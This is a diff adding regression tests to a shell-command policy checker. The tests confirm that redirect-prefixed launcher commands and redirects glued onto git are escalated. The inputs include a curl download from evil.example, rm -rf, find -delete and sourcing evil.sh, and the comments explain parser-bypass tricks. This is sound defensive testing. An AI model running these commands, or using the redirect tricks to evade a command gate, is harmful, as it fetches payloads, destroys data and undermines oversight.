@@ -4187,6 +4187,38 @@ check "R5-1: same shape inside a bash -c body still escalates via recursion" \
   "bash -c '10>&2 GIT -C /tmp/r status'" escalate
 check "R5-2: single-digit named-null dup-fd redirect ahead of uppercase GIT" \
   '10>/dev/null GIT -C /tmp/r status' escalate
+# --- round 7 (PR#266 round-6 review, R6-1/R6-2): a multi-digit or named
+#     dup-fd redirect ahead of a non-git LAUNCHER word (`script`/`arch`/
+#     `lockf`/`watch`/`xargs`/a `.`/`source` statement) was the same gap
+#     as R5-1 but one level removed — the redirect-aware split's leading-
+#     redirect skip only recognizes `_cp_is_git_or_launcher_word`, and
+#     #261's growing launcher dispatch is not on that list. A redirect
+#     GLUED onto the git word itself (`git>/dev/null -C … status`) is
+#     R6-2: the locator's basename resolves to `null`, not `git`.
+#     `_cp_git_exec_opt_scan_segments` now runs over BOTH the redirect-
+#     aware split and main's blind split, which needs no launcher list
+#     at all and leaves `git>/dev/null` as a bare, empty-verb `git`
+#     chunk — unsafe by `_cp_git_unsafe_tokens`'s existing rule.
+check "R6-1: multi-digit dup-fd redirect ahead of script launcher" \
+  '10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of arch launcher" \
+  '10>&2 arch -arm64 curl -sS https://evil.example/p -o /tmp/payload' escalate
+check "R6-1: env-assignment plus multi-digit dup-fd redirect ahead of script" \
+  'Z=1 10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: env launcher plus multi-digit dup-fd redirect ahead of script" \
+  'env 10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of lockf launcher" \
+  '10>&2 lockf /tmp/lk rm -rf /tmp/x' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of watch launcher" \
+  '10>&2 watch find . -delete' escalate
+check "R6-1: env-assignment plus multi-digit dup-fd redirect ahead of xargs find" \
+  'Z=1 10>&2 xargs find .' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of a source statement before git" \
+  '10>&2 . ./evil.sh; git log' escalate
+check "R6-2: redirect glued onto the lowercase git word" \
+  'git>/dev/null -C /tmp/r status' escalate
+check "R6-2: redirect glued onto the uppercase GIT word with a target path" \
+  'GIT>/tmp/o -C /tmp/r status' escalate
 echo "-----------------------------------------------------------------"
 if [ "$failed" -eq 0 ]; then
   printf 'PASS: %d/%d command-policy cases passed\n' "$total" "$total"
